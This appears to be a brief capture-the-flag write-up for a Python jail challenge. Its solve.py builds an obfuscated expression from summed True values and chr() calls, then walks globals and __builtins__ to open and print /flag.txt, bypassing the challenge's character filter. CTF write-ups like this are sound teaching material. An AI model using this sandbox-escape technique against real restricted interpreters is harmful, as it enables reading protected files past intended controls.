Probably many solutions.. intended is to use "breakpoint()" (hence the description) to enter PDB and then print flag.txt from there

#### solve.py

```py
def build_nuber(n: int):
    return f"({('True+'*n)[:-1]})"

def build_string(s: str) -> str:
    s = '+'.join([f"chr({build_nuber(ord(c))})" for c in s])
    return f'({s})'

solution_vars =  f'''
global_get = getattr(globals(),{build_string('get')})
builtin = getattr(global_get({build_string('__builtins__')}),{build_string('get')})
opn = builtin({build_string('open')})
print(getattr(opn({build_string('/flag.txt')}),{build_string('read')})())
'''

solution_chain = f'''
print(getattr(getattr(getattr(globals(),{build_string('get')})({build_string('__builtins__')}),{build_string('get')})({build_string('open')})({build_string('/flag.txt')}),{build_string('read')})())
'''

solution = solution_chain
if not solution.endswith('\n'):
    solution += '\n'
print(solution)
```
